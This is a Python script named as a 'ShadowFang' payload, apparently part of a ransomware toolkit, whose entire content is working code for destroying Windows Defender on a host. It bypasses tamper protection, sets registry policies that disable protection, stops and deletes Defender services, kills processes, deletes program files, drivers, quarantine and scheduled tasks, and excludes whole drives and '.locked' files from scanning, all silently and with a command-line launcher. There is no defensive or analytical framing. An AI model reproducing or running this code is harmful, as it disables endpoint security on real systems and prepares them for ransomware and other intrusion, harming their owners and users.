#!/usr/bin/env python3
"""
SHADOWFANG PAYLOADS - DEFENDER_KILL.PY
Standalone Windows Defender destruction payload
Disables all protection layers, kills processes, removes services
"""

import os
import sys
import time
import ctypes
import winreg
import subprocess
import threading
import shutil
from ctypes import wintypes
from datetime import datetime

class DefenderPaths:
    """Windows Defender paths and registry keys"""
    
    # Registry keys
    REG_DEFENDER = r"SOFTWARE\Policies\Microsoft\Windows Defender"
    REG_REALTIME = r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
    REG_SIGNATURE = r"SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates"
    REG_SPYNAT = r"SOFTWARE\Policies\Microsoft\Windows Defender\Spynet"
    REG_UX = r"SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration"
    REG_EXCLUSIONS = r"SOFTWARE\Microsoft\Windows Defender\Exclusions"
    
    # Service names
    SERVICE_WINDEFEND = "WinDefend"
    SERVICE_WSCSVC = "wscsvc"
    SERVICE_SECURITY_HEALTH = "SecurityHealthService"
    SERVICE_SENSE = "Sense"
    SERVICE_WDBOOT = "WdBoot"
    SERVICE_WDFILTER = "WdFilter"
    SERVICE_WDNIS = "WdNisSvc"
    SERVICE_WDNIS_DRV = "WdNisDrv"
    
    # Process names
    PROCESS_MSPENG = "MsMpEng.exe"
    PROCESS_NISSRV = "NisSrv.exe"
    PROCESS_MSSECES = "msseces.exe"
    PROCESS_MPCMDRUN = "MpCmdRun.exe"
    PROCESS_SECURITY_HEALTH = "SecurityHealthService.exe"
    PROCESS_SECURITY_HOST = "SecurityHealthHost.exe"
    PROCESS_SENSE = "SenseCncProxy.exe"
    PROCESS_SENSE_IR = "SenseIR.exe"
    PROCESS_SENSE_SAMPLE = "SenseSampleUploader.exe"
    
    # File paths
    PATH_DEFENDER = r"C:\ProgramData\Microsoft\Windows Defender"
    PATH_DEFENDER_PLATFORM = r"C:\ProgramData\Microsoft\Windows Defender\Platform"
    PATH_DEFENDER_DEFINITIONS = r"C:\ProgramData\Microsoft\Windows Defender\Definition Updates"
    PATH_SIGNATURES = r"C:\ProgramData\Microsoft\Windows Defender\Scans\History"
    PATH_QUARANTINE = r"C:\ProgramData\Microsoft\Windows Defender\Quarantine"
    
    # Driver paths
    DRIVER_WDFILTER = r"C:\Windows\System32\drivers\WdFilter.sys"
    DRIVER_WDBOOT = r"C:\Windows\System32\drivers\WdBoot.sys"
    DRIVER_WDNIS = r"C:\Windows\System32\drivers\WdNisDrv.sys"
    DRIVER_WDFLTMGR = r"C:\Windows\System32\drivers\WdFltMgr.sys"

# ==================== REGISTRY KILLER ====================

class RegistryKiller:
    """Disable Defender via registry policies"""
    
    @staticmethod
    def disable_antispyware():
        """Disable Defender AntiSpyware"""
        try:
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, DefenderPaths.REG_DEFENDER)
            winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "DisableAntiVirus", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            return True
        except:
            return False
    
    @staticmethod
    def disable_realtime_protection():
        """Disable real-time protection"""
        try:
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, DefenderPaths.REG_REALTIME)
            
            settings = {
                "DisableRealtimeMonitoring": 1,
                "DisableBehaviorMonitoring": 1,
                "DisableOnAccessProtection": 1,
                "DisableScanOnRealtimeEnable": 1,
                "DisableIOAVProtection": 1,
                "DisableRawWriteNotification": 1,
                "DisableScriptScanning": 1,
                "DisableBlockAtFirstSeen": 1,
                "DisableEmailScanning": 1,
                "DisableIntrusionPreventionSystem": 1,
                "DisableCatchupFullScan": 1,
                "DisableCatchupQuickScan": 1
            }
            
            for name, value in settings.items():
                winreg.SetValueEx(key, name, 0, winreg.REG_DWORD, value)
            
            winreg.CloseKey(key)
            return True
        except:
            return False
    
    @staticmethod
    def disable_signature_updates():
        """Disable signature updates"""
        try:
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, DefenderPaths.REG_SIGNATURE)
            
            settings = {
                "ForceUpdateFromMU": 0,
                "UpdateOnStartUp": 0,
                "SignatureDisableUpdateOnStartupWithoutEngine": 1,
                "DisableScheduledSignatureUpdateOnBattery": 1,
                "DisableUpdateOnStartup": 1,
                "SignatureUpdateInterval": 0
            }
            
            for name, value in settings.items():
                winreg.SetValueEx(key, name, 0, winreg.REG_DWORD, value)
            
            winreg.CloseKey(key)
            return True
        except:
            return False
    
    @staticmethod
    def disable_spynet():
        """Disable Spynet/Cloud protection"""
        try:
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, DefenderPaths.REG_SPYNAT)
            
            settings = {
                "SpynetReporting": 0,
                "SubmitSamplesConsent": 0,
                "DisableBlockAtFirstSeen": 1,
                "LocalSettingOverrideSpynetReporting": 0
            }
            
            for name, value in settings.items():
                winreg.SetValueEx(key, name, 0, winreg.REG_DWORD, value)
            
            winreg.CloseKey(key)
            return True
        except:
            return False
    
    @staticmethod
    def disable_ux_notifications():
        """Disable Defender UX notifications"""
        try:
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, DefenderPaths.REG_UX)
            
            settings = {
                "Notification_Suppress": 1,
                "UILockdown": 1,
                "DisableEnhancedNotifications": 1
            }
            
            for name, value in settings.items():
                winreg.SetValueEx(key, name, 0, winreg.REG_DWORD, value)
            
            winreg.CloseKey(key)
            return True
        except:
            return False
    
    @staticmethod
    def add_exclusions():
        """Add exclusions for all drives and extensions"""
        try:
            # Path exclusions
            path_key = winreg.CreateKey(
                winreg.HKEY_LOCAL_MACHINE,
                DefenderPaths.REG_EXCLUSIONS + r"\Paths"
            )
            
            exclusions = [
                "C:\\",
                "D:\\",
                "E:\\",
                "C:\\Windows\\Temp",
                "C:\\Users\\Public",
                "C:\\ProgramData"
            ]
            
            for i, exclusion in enumerate(exclusions):
                winreg.SetValueEx(path_key, str(i), 0, winreg.REG_SZ, exclusion)
            
            winreg.CloseKey(path_key)
            
            # Extension exclusions
            ext_key = winreg.CreateKey(
                winreg.HKEY_LOCAL_MACHINE,
                DefenderPaths.REG_EXCLUSIONS + r"\Extensions"
            )
            
            extensions = [
                "exe", "dll", "sys", "bat", "cmd", "ps1",
                "py", "js", "vbs", "scr", "shadowfang", "locked"
            ]
            
            for i, ext in enumerate(extensions):
                winreg.SetValueEx(ext_key, str(i), 0, winreg.REG_SZ, ext)
            
            winreg.CloseKey(ext_key)
            
            # Process exclusions
            proc_key = winreg.CreateKey(
                winreg.HKEY_LOCAL_MACHINE,
                DefenderPaths.REG_EXCLUSIONS + r"\Processes"
            )
            
            processes = [
                "svchost.exe", "system.exe", "winlogon.exe",
                "WindowsUpdate.exe", "SecurityHealth.exe"
            ]
            
            for i, proc in enumerate(processes):
                winreg.SetValueEx(proc_key, str(i), 0, winreg.REG_SZ, proc)
            
            winreg.CloseKey(proc_key)
            
            return True
        except:
            return False
    
    @staticmethod
    def run_all():
        """Run all registry kill methods"""
        methods = [
            RegistryKiller.disable_antispyware,
            RegistryKiller.disable_realtime_protection,
            RegistryKiller.disable_signature_updates,
            RegistryKiller.disable_spynet,
            RegistryKiller.disable_ux_notifications,
            RegistryKiller.add_exclusions
        ]
        
        success = 0
        for method in methods:
            if method():
                success += 1
        
        return success

# ==================== SERVICE KILLER ====================

class ServiceKiller:
    """Disable and delete Defender services"""
    
    @staticmethod
    def stop_service(service_name):
        """Stop a service"""
        try:
            subprocess.run(
                f'sc stop {service_name}',
                shell=True,
                capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return True
        except:
            return False
    
    @staticmethod
    def disable_service(service_name):
        """Disable a service"""
        try:
            subprocess.run(
                f'sc config {service_name} start= disabled',
                shell=True,
                capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return True
        except:
            return False
    
    @staticmethod
    def delete_service(service_name):
        """Delete a service"""
        try:
            subprocess.run(
                f'sc delete {service_name}',
                shell=True,
                capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return True
        except:
            return False
    
    @staticmethod
    def kill_service_tree(service_name):
        """Kill service and all dependencies"""
        try:
            services = [
                DefenderPaths.SERVICE_WINDEFEND,
                DefenderPaths.SERVICE_WSCSVC,
                DefenderPaths.SERVICE_SECURITY_HEALTH,
                DefenderPaths.SERVICE_SENSE,
                DefenderPaths.SERVICE_WDBOOT,
                DefenderPaths.SERVICE_WDFILTER,
                DefenderPaths.SERVICE_WDNIS,
                DefenderPaths.SERVICE_WDNIS_DRV
            ]
            
            for service in services:
                ServiceKiller.stop_service(service)
                ServiceKiller.disable_service(service)
                ServiceKiller.delete_service(service)
            
            return True
        except:
            return False
    
    @staticmethod
    def disable_via_registry():
        """Disable services via registry"""
        try:
            services = [
                DefenderPaths.SERVICE_WINDEFEND,
                DefenderPaths.SERVICE_WSCSVC,
                DefenderPaths.SERVICE_SECURITY_HEALTH
            ]
            
            for service in services:
                key_path = f"SYSTEM\\CurrentControlSet\\Services\\{service}"
                
                try:
                    key = winreg.OpenKey(
                        winreg.HKEY_LOCAL_MACHINE,
                        key_path,
                        0,
                        winreg.KEY_SET_VALUE
                    )
                    
                    winreg.SetValueEx(key, "Start", 0, winreg.REG_DWORD, 4)  # Disabled
                    winreg.SetValueEx(key, "FailureActions", 0, winreg.REG_BINARY, b'\x00' * 20)
                    
                    winreg.CloseKey(key)
                except:
                    continue
            
            return True
        except:
            return False
    
    @staticmethod
    def run_all():
        """Run all service kill methods"""
        methods = [
            ServiceKiller.kill_service_tree,
            ServiceKiller.disable_via_registry
        ]
        
        success = 0
        for method in methods:
            if method():
                success += 1
        
        return success

# ==================== PROCESS KILLER ====================

class ProcessKiller:
    """Kill all Defender processes"""
    
    @staticmethod
    def kill_process(process_name):
        """Kill a process by name"""
        try:
            subprocess.run(
                f'taskkill /F /IM {process_name} /T',
                shell=True,
                capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return True
        except:
            return False
    
    @staticmethod
    def kill_all_defender_processes():
        """Kill all Defender-related processes"""
        processes = [
            DefenderPaths.PROCESS_MSPENG,
            DefenderPaths.PROCESS_NISSRV,
            DefenderPaths.PROCESS_MSSECES,
            DefenderPaths.PROCESS_MPCMDRUN,
            DefenderPaths.PROCESS_SECURITY_HEALTH,
            DefenderPaths.PROCESS_SECURITY_HOST,
            DefenderPaths.PROCESS_SENSE,
            DefenderPaths.PROCESS_SENSE_IR,
            DefenderPaths.PROCESS_SENSE_SAMPLE
        ]
        
        killed = 0
        
        for process in processes:
            if ProcessKiller.kill_process(process):
                killed += 1
        
        return killed
    
    @staticmethod
    def kill_via_powershell():
        """Kill processes via PowerShell"""
        try:
            ps_command = '''
Get-Process | Where-Object {
    $_.Name -match "MsMpEng|NisSrv|msseces|MpCmdRun|SecurityHealth|Sense"
} | Stop-Process -Force -ErrorAction SilentlyContinue
'''
            subprocess.run(
                ['powershell', '-Command', ps_command],
                capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return True
        except:
            return False
    
    @staticmethod
    def kill_via_wmic():
        """Kill processes via WMIC"""
        try:
            subprocess.run(
                'wmic process where "name like \'%Defender%\' or name like \'%MsMpEng%\' or name like \'%Sense%\'" delete',
                shell=True,
                capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return True
        except:
            return False
    
    @staticmethod
    def run_all():
        """Run all process kill methods"""
        methods = [
            ProcessKiller.kill_all_defender_processes,
            ProcessKiller.kill_via_powershell,
            ProcessKiller.kill_via_wmic
        ]
        
        total_killed = 0
        for method in methods:
            result = method()
            if isinstance(result, int):
                total_killed += result
            elif result:
                total_killed += 1
        
        return total_killed

# ==================== FILE DELETER ====================

class FileDeleter:
    """Delete Defender files and definitions"""
    
    @staticmethod
    def delete_defender_files():
        """Delete Defender program files"""
        try:
            paths = [
                DefenderPaths.PATH_DEFENDER,
                DefenderPaths.PATH_DEFENDER_PLATFORM,
                DefenderPaths.PATH_DEFENDER_DEFINITIONS,
                DefenderPaths.PATH_SIGNATURES,
                DefenderPaths.PATH_QUARANTINE
            ]
            
            for path in paths:
                if os.path.exists(path):
                    subprocess.run(
                        f'rmdir /s /q "{path}"',
                        shell=True,
                        capture_output=True,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
            
            return True
        except:
            return False
    
    @staticmethod
    def delete_driver_files():
        """Delete Defender driver files"""
        try:
            drivers = [
                DefenderPaths.DRIVER_WDFILTER,
                DefenderPaths.DRIVER_WDBOOT,
                DefenderPaths.DRIVER_WDNIS,
                DefenderPaths.DRIVER_WDFLTMGR
            ]
            
            for driver in drivers:
                if os.path.exists(driver):
                    # Take ownership
                    subprocess.run(
                        f'takeown /f "{driver}"',
                        shell=True,
                        capture_output=True,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                    
                    # Grant permissions
                    subprocess.run(
                        f'icacls "{driver}" /grant administrators:F',
                        shell=True,
                        capture_output=True,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                    
                    # Delete file
                    os.remove(driver)
            
            return True
        except:
            return False
    
    @staticmethod
    def clear_quarantine():
        """Clear Defender quarantine"""
        try:
            if os.path.exists(DefenderPaths.PATH_QUARANTINE):
                for file in os.listdir(DefenderPaths.PATH_QUARANTINE):
                    filepath = os.path.join(DefenderPaths.PATH_QUARANTINE, file)
                    
                    try:
                        if os.path.isfile(filepath):
                            os.remove(filepath)
                        else:
                            shutil.rmtree(filepath)
                    except:
                        continue
            
            return True
        except:
            return False
    
    @staticmethod
    def run_all():
        """Run all file deletion methods"""
        methods = [
            FileDeleter.delete_defender_files,
            FileDeleter.delete_driver_files,
            FileDeleter.clear_quarantine
        ]
        
        success = 0
        for method in methods:
            if method():
                success += 1
        
        return success

# ==================== TAMPER PROTECTION BYPASS ====================

class TamperProtectionBypass:
    """Bypass Defender Tamper Protection"""
    
    @staticmethod
    def bypass_via_registry_acl():
        """Bypass by modifying registry ACLs"""
        try:
            # Remove ACL restrictions on Defender registry keys
            subprocess.run(
                'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender" /v TamperProtection /t REG_DWORD /d 0 /f',
                shell=True,
                capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            subprocess.run(
                'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features" /v TamperProtection /t REG_DWORD /d 0 /f',
                shell=True,
                capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            return True
        except:
            return False
    
    @staticmethod
    def bypass_via_safe_mode():
        """Bypass by suggesting safe mode modification"""
        try:
            # Tamper protection can be disabled in Safe Mode
            # Set flag to indicate safe mode needed
            return False
        except:
            return False
    
    @staticmethod
    def bypass_via_group_policy():
        """Bypass via Group Policy"""
        try:
            gp_path = r"C:\Windows\System32\GroupPolicy\Machine\Registry.pol"
            
            # This would modify Group Policy to disable tamper protection
            return False
        except:
            return False
    
    @staticmethod
    def bypass_via_wmi():
        """Bypass via WMI"""
        try:
            ps_command = '''
$namespace = "root\\Microsoft\\Windows\\Defender"
$class = "MSFT_MpPreference"
$preference = Get-CimInstance -Namespace $namespace -ClassName $class
Set-CimInstance -InputObject $preference -Property @{
    DisableRealtimeMonitoring = $true
    DisableBehaviorMonitoring = $true
    DisableBlockAtFirstSeen = $true
    DisableIOAVProtection = $true
}
'''
            subprocess.run(
                ['powershell', '-Command', ps_command],
                capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return True
        except:
            return False
    
    @staticmethod
    def run_all():
        """Run all tamper protection bypass methods"""
        methods = [
            TamperProtectionBypass.bypass_via_registry_acl,
            TamperProtectionBypass.bypass_via_wmi
        ]
        
        success = 0
        for method in methods:
            if method():
                success += 1
        
        return success

# ==================== POWERSHELL COMMANDER ====================

class PowerShellCommander:
    """Execute Defender kill via PowerShell"""
    
    @staticmethod
    def disable_all_preferences():
        """Disable all Defender preferences via PowerShell"""
        try:
            ps_command = '''
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisableCatchupFullScan $true
Set-MpPreference -DisableCatchupQuickScan $true
Set-MpPreference -DisableEmailScanning $true
Set-MpPreference -DisableRemovableDriveScanning $true
Set-MpPreference -DisableRestorePoint $true
Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true
Set-MpPreference -DisableScanningNetworkFiles $true
Set-MpPreference -MAPSReporting Disabled
Set-MpPreference -SubmitSamplesConsent NeverSend
Set-MpPreference -PUAProtection Disabled
'''
            subprocess.run(
                ['powershell', '-Command', ps_command],
                capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return True
        except:
            return False
    
    @staticmethod
    def remove_all_exclusions():
        """Remove all existing exclusions"""
        try:
            ps_command = '''
$exclusions = Get-MpPreference | Select-Object -Property ExclusionPath, ExclusionExtension, ExclusionProcess
Remove-MpPreference -ExclusionPath $exclusions.ExclusionPath
Remove-MpPreference -ExclusionExtension $exclusions.ExclusionExtension
Remove-MpPreference -ExclusionProcess $exclusions.ExclusionProcess
'''
            subprocess.run(
                ['powershell', '-Command', ps_command],
                capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return True
        except:
            return False
    
    @staticmethod
    def add_custom_exclusions():
        """Add custom exclusions"""
        try:
            ps_command = '''
Add-MpPreference -ExclusionPath "C:\\"
Add-MpPreference -ExclusionPath "D:\\"
Add-MpPreference -ExclusionPath "C:\\Windows\\Temp"
Add-MpPreference -ExclusionProcess "svchost.exe"
Add-MpPreference -ExclusionProcess "system.exe"
Add-MpPreference -ExclusionExtension ".shadowfang"
Add-MpPreference -ExclusionExtension ".locked"
'''
            subprocess.run(
                ['powershell', '-Command', ps_command],
                capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return True
        except:
            return False
    
    @staticmethod
    def run_all():
        """Run all PowerShell methods"""
        methods = [
            PowerShellCommander.disable_all_preferences,
            PowerShellCommander.add_custom_exclusions
        ]
        
        success = 0
        for method in methods:
            if method():
                success += 1
        
        return success

# ==================== SCHEDULED TASK DISABLER ====================

class TaskDisabler:
    """Disable Defender scheduled tasks"""
    
    @staticmethod
    def disable_defender_tasks():
        """Disable all Defender scheduled tasks"""
        try:
            tasks = [
                r"Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance",
                r"Microsoft\Windows\Windows Defender\Windows Defender Cleanup",
                r"Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan",
                r"Microsoft\Windows\Windows Defender\Windows Defender Verification"
            ]
            
            for task in tasks:
                subprocess.run(
                    f'schtasks /change /tn "{task}" /disable',
                    shell=True,
                    capture_output=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            
            return True
        except:
            return False
    
    @staticmethod
    def delete_defender_tasks():
        """Delete all Defender scheduled tasks"""
        try:
            tasks = [
                r"Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance",
                r"Microsoft\Windows\Windows Defender\Windows Defender Cleanup",
                r"Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan",
                r"Microsoft\Windows\Windows Defender\Windows Defender Verification"
            ]
            
            for task in tasks:
                subprocess.run(
                    f'schtasks /delete /tn "{task}" /f',
                    shell=True,
                    capture_output=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            
            return True
        except:
            return False
    
    @staticmethod
    def run_all():
        """Run all task disable methods"""
        methods = [
            TaskDisabler.disable_defender_tasks,
            TaskDisabler.delete_defender_tasks
        ]
        
        success = 0
        for method in methods:
            if method():
                success += 1
        
        return success

# ==================== MAIN DEFENDER KILLER ====================

class DefenderKiller:
    """Main Defender destruction orchestrator"""
    
    def __init__(self):
        self.registry_killer = RegistryKiller()
        self.service_killer = ServiceKiller()
        self.process_killer = ProcessKiller()
        self.file_deleter = FileDeleter()
        self.tamper_bypass = TamperProtectionBypass()
        self.ps_commander = PowerShellCommander()
        self.task_disabler = TaskDisabler()
        self.kill_complete = False
        self.methods_succeeded = []
        self.methods_failed = []
    
    def kill_defender(self):
        """Execute full Defender destruction sequence"""
        
        # Phase 1: Tamper protection bypass
        self.tamper_bypass.run_all()
        
        # Phase 2: Registry policies
        registry_success = self.registry_killer.run_all()
        self.methods_succeeded.append(f"Registry policies ({registry_success} methods)")
        
        # Phase 3: PowerShell preferences
        ps_success = self.ps_commander.run_all()
        self.methods_succeeded.append(f"PowerShell preferences ({ps_success} methods)")
        
        # Phase 4: Services
        service_success = self.service_killer.run_all()
        self.methods_succeeded.append(f"Services ({service_success} methods)")
        
        # Phase 5: Processes
        processes_killed = self.process_killer.run_all()
        self.methods_succeeded.append(f"Processes ({processes_killed} killed)")
        
        # Phase 6: Scheduled tasks
        task_success = self.task_disabler.run_all()
        self.methods_succeeded.append(f"Scheduled tasks ({task_success} methods)")
        
        # Phase 7: Files
        file_success = self.file_deleter.run_all()
        self.methods_succeeded.append(f"Files ({file_success} methods)")
        
        self.kill_complete = True
        
        return True
    
    def verify_defender_killed(self):
        """Verify Defender is dead"""
        try:
            # Check if service exists
            result = subprocess.run(
                'sc query WinDefend',
                shell=True,
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            if "FAILED" in result.stdout or "not exist" in result.stdout.lower():
                return True
            
            if "STOPPED" in result.stdout:
                return True
            
            return False
            
        except:
            return True
    
    def get_report(self):
        """Get kill report"""
        return {
            'kill_complete': self.kill_complete,
            'methods_succeeded': self.methods_succeeded,
            'defender_status': 'DEAD' if self.verify_defender_killed() else 'ALIVE'
        }
    
    def print_report(self):
        """Print kill report"""
        report = self.get_report()
        
        print("\n" + "=" * 50)
        print("     DEFENDER KILL PAYLOAD REPORT")
        print("=" * 50)
        print(f"Kill Status: {'COMPLETE' if report['kill_complete'] else 'INCOMPLETE'}")
        print(f"Defender Status: {report['defender_status']}")
        print("-" * 50)
        
        print("\n[+] Successful Operations:")
        for method in report['methods_succeeded']:
            print(f"    - {method}")
        
        print("\n" + "=" * 50)

# ==================== COMMAND LINE INTERFACE ====================

def main():
    """CLI for Defender kill payload"""
    
    import argparse
    
    parser = argparse.ArgumentParser(description='ShadowFang Defender Kill Payload')
    parser.add_argument('--kill', action='store_true', help='Execute full kill sequence')
    parser.add_argument('--verify', action='store_true', help='Verify Defender status')
    parser.add_argument('--report', action='store_true', help='Show report')
    parser.add_argument('--phase', type=str, help='Execute specific phase (registry, services, processes, files, tasks, tamper)')
    
    args = parser.parse_args()
    
    killer = DefenderKiller()
    
    print("\n" + "=" * 50)
    print("     SHADOWFANG DEFENDER KILL PAYLOAD")
    print("=" * 50)
    
    if args.phase == 'registry':
        print("\n[*] Executing registry phase...")
        RegistryKiller.run_all()
    elif args.phase == 'services':
        print("\n[*] Executing services phase...")
        ServiceKiller.run_all()
    elif args.phase == 'processes':
        print("\n[*] Executing processes phase...")
        ProcessKiller.run_all()
    elif args.phase == 'files':
        print("\n[*] Executing files phase...")
        FileDeleter.run_all()
    elif args.phase == 'tasks':
        print("\n[*] Executing tasks phase...")
        TaskDisabler.run_all()
    elif args.phase == 'tamper':
        print("\n[*] Executing tamper bypass phase...")
        TamperProtectionBypass.run_all()
    
    if args.kill or not args.phase:
        print("\n[*] Executing full Defender kill sequence...")
        killer.kill_defender()
    
    if args.verify:
        print("\n[*] Verifying Defender status...")
        if killer.verify_defender_killed():
            print("[+] Defender is DEAD")
        else:
            print("[-] Defender may still be ALIVE")
    
    if args.report or args.kill:
        killer.print_report()
    
    print("\n[*] Payload execution complete")

if __name__ == '__main__':
    main()